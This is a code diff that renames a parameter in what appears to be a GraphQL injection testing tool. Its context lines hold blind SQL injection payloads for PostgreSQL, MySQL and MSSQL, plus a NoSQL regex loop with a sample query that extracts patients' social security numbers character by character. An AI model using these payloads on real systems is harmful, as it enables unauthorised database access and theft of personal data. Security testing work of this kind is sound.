@@ -139,34 +139,34 @@ def exec_advanced(URL, method, query, headers):
         print(exec_graphql(URL, method, query, headers))
 
 
-def blind_postgresql(URL, method, headers):
+def blind_postgresql(url, method, headers):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    r = requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_mysql(URL, method, headers):
+def blind_mysql(url, method, headers):
     query = input("Query > ")
     payload = "'-SLEEP(30); #"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    r = requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_mssql(URL, method, headers):
+def blind_mssql(url, method, headers):
     query = input("Query > ")
     payload = "'; WAITFOR DELAY '00:00:30';"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    r = requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_nosql(URL, method, headers):
+def blind_nosql(url, method, headers):
     # Query : {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
     # Check : "5d089c51dcab2d0032fdd08d"
 
@@ -179,7 +179,7 @@ def blind_nosql(URL, method, headers):
     while len(data) != data_size:
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
-            r = requester(URL, method, injected, headers)
+            r = requester(url, method, injected, headers)
             if check in r.text:
                 data += c
 
